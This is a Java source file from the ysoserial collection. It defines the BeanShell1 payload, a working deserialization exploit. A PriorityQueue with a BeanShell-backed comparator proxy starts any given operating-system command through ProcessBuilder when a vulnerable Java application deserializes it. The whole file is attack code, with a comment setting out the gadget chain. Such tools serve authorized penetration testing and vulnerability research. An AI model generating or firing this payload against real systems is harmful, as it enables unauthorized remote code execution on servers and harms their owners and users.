package ysoserial.payloads;

import bsh.Interpreter;
import bsh.XThis;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.Comparator;
import java.util.PriorityQueue;

import ysoserial.Strings;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.util.Reflections;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;

/**
 * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
 *
 * Gadget chain:
 * PriorityQueue.readObject()
 *     HashMap.put()
 *         heapify()
 *             siftDown()
 *                 siftDownUsingComparator()
 *                     comparator.compare()
 *                         invokeMethod()
 */



@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.beanshell:bsh:2.0b5"})
@Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {

    public PriorityQueue getObject(String command) throws Exception {
        // BeanShell payload

        String payload =
            "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
                Strings.join( // does not support spaces in quotes
                    Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"").split(" ")),
                    ",", "\"", "\"") +
                "}).start();return new Integer(1);}";

        // Create Interpreter
        Interpreter i = new Interpreter();//解释器。定义语言的文法 ,并且建立一个解释器来解释该语言中的句子。通俗来讲就是定义一套规则，然后有个工具类，根据你传入的参数就知道你表达的意思。

        // Evaluate payload
        i.eval(payload);

        // Create InvocationHandler
        XThis xt = new XThis(i.getNameSpace(), i);
        InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);

        // Create Comparator Proxy
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

        // Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
        final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[]{1, 1};
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", 2);

        return priorityQueue;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(BeanShell1.class, args);
    }
}
